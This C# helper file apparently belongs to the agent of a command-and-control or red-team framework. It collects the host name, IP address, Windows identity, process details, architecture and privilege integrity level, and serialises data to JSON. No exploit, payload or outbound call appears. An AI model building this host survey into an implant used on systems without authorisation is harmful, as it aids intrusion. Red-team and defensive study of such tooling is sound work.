using AgentCore.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization.Json;
using System.Security.Principal;
using System.Text;

namespace AgentCore
{
    public class Helpers
    {
        public static string GetHostname
        {
            get
            {
                return Dns.GetHostName();
            }
        }

        public static string GetIpAddress
        {
            get
            {
                return Dns.GetHostEntry(Dns.GetHostName()).AddressList
                    .Where(a => a.AddressFamily == AddressFamily.InterNetwork).FirstOrDefault().ToString();
            }
        }

        public static string GetIdentity
        {
            get
            {
                return WindowsIdentity.GetCurrent().Name;
            }
        }

        public static string GetProcessName
        {
            get
            {
                return Process.GetCurrentProcess().ProcessName;
            }
        }
        public static int GetProcessId
        {
            get
            {
                return Process.GetCurrentProcess().Id;
            }
        }

        public static Arch GetArch
        {
            get
            {
                return IntPtr.Size == 8 ? Arch.x64 : Arch.x86; // if 8 return x64 else x86
            }
        }

        public static Integrity GetIntegrity
        {
            get
            {
                var integrity = Integrity.Medium;
                var identity = WindowsIdentity.GetCurrent();
                if (Environment.UserName.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase))
                {
                    integrity = Integrity.SYSTEM;
                }
                else if (identity.User != identity.Owner)
                {
                    integrity = Integrity.High;
                }
                return integrity;
            }
        }

        public static byte[] SerialiseData<T>(T data)
        {
            using (var ms = new MemoryStream())
            {
                var serialiser = new DataContractJsonSerializer(typeof(T));
                serialiser.WriteObject(ms, data);
                return ms.ToArray();
            }
        }

        public static T DeserialiseData<T>(byte[] data)
        {
            using (var ms = new MemoryStream(data))
            {
                var serialiser = new DataContractJsonSerializer(typeof(T));
                return (T)serialiser.ReadObject(ms);
            }
        }
    }
}
